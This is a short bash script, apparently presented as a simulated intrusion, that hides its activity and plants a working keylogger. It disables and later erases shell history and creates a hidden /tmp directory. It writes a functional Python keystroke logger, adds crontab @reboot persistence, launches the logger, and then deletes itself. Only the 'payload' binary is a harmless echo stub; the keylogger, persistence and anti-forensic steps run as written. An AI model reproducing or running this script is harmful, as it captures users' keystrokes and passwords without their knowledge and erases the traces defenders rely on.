#!/bin/bash

# Step 1: Disable history tracking for this session
unset HISTFILE
HISTSIZE=0
HISTFILESIZE=0
set +o history

# Step 2: Prepare hidden directory and download simulated payload
TMP_DIR="/tmp/.sysd"
BIN_PATH="$TMP_DIR/shell.elf"
KEYLOGGER_PATH="$TMP_DIR/keylogger.py"

mkdir -p "$TMP_DIR"

# Download fake ELF binary (replace this with harmless binary or echo simulator)
echo -e '#!/bin/bash\necho "Simulated Payload Running..."' > "$BIN_PATH"
chmod +x "$BIN_PATH"

# Step 3: Create a simulated keylogger using Python
cat > "$KEYLOGGER_PATH" <<EOF
from pynput import keyboard

def on_press(key):
    with open("/tmp/.sysd/keys.log", "a") as f:
        f.write(str(key) + "\\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
EOF

# Step 4: Make sure Python keylogger runs at boot (requires crontab)
(crontab -l 2>/dev/null; echo "@reboot python3 $KEYLOGGER_PATH &") | crontab -
(crontab -l 2>/dev/null; echo "@reboot $BIN_PATH &") | crontab -

# Step 5: Run both now
python3 "$KEYLOGGER_PATH" >/dev/null 2>&1 &
"$BIN_PATH" >/dev/null 2>&1 &

# Step 6: Clear traces
sleep 1
rm -f ~/.bash_history ~/.zsh_history
history -c
[ -f "$0" ] && rm -- "$0"

exit 0
